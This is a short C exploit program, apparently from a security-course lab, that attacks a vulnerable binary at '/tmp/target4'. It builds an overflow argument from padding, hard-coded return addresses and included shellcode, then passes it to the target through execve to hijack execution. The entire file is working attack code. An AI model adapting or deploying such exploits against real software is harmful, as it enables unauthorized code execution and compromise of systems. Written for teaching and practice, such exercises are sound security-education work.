#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	char arg1[100];
	strcpy(arg1, "aaaabbbbcccc\x08\xfd\xff\xbe");
	strcpy(arg1+16, shellcode);
	strcat(arg1, "aaaaaaaaaaaaaaaaaaaaaaaaaabbbbb\xf8\xfc\xff\xbe");
	char arg2[] = "0";
	char arg3[] = "53";
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
